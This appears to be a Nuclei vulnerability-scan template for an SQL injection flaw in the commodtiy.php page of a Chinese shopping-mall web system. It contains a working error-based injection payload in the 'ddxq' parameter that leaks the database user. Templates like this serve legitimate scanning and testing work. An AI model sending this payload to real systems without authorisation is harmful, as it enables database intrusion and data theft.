id: shopping-mail-commodtiy-sqli

info:
  name: Shopping Mail commodtiy.php - SQL Injection
  author: qwtd
  severity: high
  description: |-
    购物商城系统commodtiy存在任意SQL注入漏洞
  reference:
    - https://wiki.wy876.cn/#/./%E8%B4%AD%E7%89%A9%E5%95%86%E5%9F%8E%E7%B3%BB%E7%BB%9F/%E8%B4%AD%E7%89%A9%E5%95%86%E5%9F%8E%E7%B3%BB%E7%BB%9Fcommodtiy%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8FSQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E
  tags: 购物商城系统

http:
  - raw:
      - |
        POST /public/commodtiy.php HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36
        Connection: close

        ddxq='||(SELECT 0x4776756d WHERE 3443=3443 AND (SELECT 9303 FROM(SELECT COUNT(*),CONCAT((MID((IFNULL(CAST(CURRENT_USER() AS NCHAR),0x20)),1,54)),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a))||'

    matchers-condition: and
    matchers:
      - type: word
        words:
          - "mysqli_fetch_assoc"
      - type: status
        status:
          - 200
